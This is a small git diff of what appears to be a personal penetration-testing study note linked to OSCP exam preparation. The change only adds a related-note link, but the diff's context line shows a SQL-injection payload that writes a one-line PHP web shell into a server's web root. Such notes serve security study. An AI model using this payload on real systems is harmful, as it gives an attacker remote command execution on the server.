@@ -8,6 +8,7 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
 
 # Related
 
+- [20221010153630](/zet/20221010153630/README.md) make symlinks for markdown titles for search optimization
 - [20221009015558](/zet/20221009015558/README.md) docker
 - [20221009015032](/zet/20221009015032/README.md) let's make a dockerfile for zet cmd
 - [20221009001740](/zet/20221009001740/README.md) OSCP exam
